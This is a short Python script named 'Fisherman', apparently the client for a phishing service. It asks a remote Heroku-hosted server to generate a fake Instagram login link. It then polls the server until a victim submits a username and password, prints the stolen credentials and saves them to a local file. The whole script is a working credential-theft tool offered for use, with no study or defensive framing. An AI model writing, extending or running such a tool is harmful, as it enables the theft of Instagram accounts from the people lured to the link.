import requests
import json
import time

print('Welcome to Fisherman.', end='\n\n')

URL = 'https://metafb.herokuapp.com'

def watch_link(data):
    '''Data should be a dictionacy with "url" and "key".'''
    while True:
        response = requests.post(url = URL+'/extract', data = data)
        res = response.json()
        try:
            print(f'\nusername: \x1b[31m{res["username"]}\x1b[m')
            print(f'password: \x1b[33m{res["password"]}\x1b[m')
            return res
        except KeyError:
            time.sleep(5)

def generate_new_link(site):
    if site == 'instagram':
        data = { 'site': 'instagram' }
    else:
        exit(1)
    response = requests.post(url = URL+'/generate', data = data)
    if not response:
        print('failed to generate link...')
    else:
        return response.json()


if __name__ == '__main__':

    y_or_n = input("Generate link for 'Instagram' [Y/n]: ")
    if y_or_n == 'n' or y_or_n == 'N':
        exit(0)
    data = generate_new_link('instagram')
    if data is not None:
        link = URL + '/' + data['url']
        print(f'link: \x1b[32m{link}\x1b[m')
        print(f'key: \x1b[33m{data["key"]}\x1b[m')
        credentials = watch_link(data)
        if credentials is not None:
            with open("secret.txt", "w") as f:
                f.write(credentials["username"])
                f.write('\n')
                f.write(credentials["password"])
                f.write('\n')
